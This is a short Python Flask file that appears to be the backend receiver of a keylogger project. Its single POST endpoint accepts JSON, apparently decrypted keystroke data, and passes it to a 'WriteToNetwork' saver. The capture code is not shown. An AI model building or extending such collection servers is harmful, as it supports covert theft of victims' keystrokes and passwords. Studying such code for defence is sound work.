from flask import Flask, jsonify, request
from flask_cors import CORS, cross_origin
# from keyloggerAgent.manager_keyLogger import manager
from keyloggerBackend.save_data import WriteToNetwork

app = Flask(__name__)
CORS(app)


@app.route('/', methods=['POST'])
def save_decrypted_data():
    data=request.get_json()
    WriteToNetwork().write(data)
    print(data)
    if not data:
        return jsonify({"error": "No data received"}), 400



    return jsonify({"status": "success"}), 200
    # return jsonify({"data": data})

if __name__ == '__main__':
    app.run(debug=True)
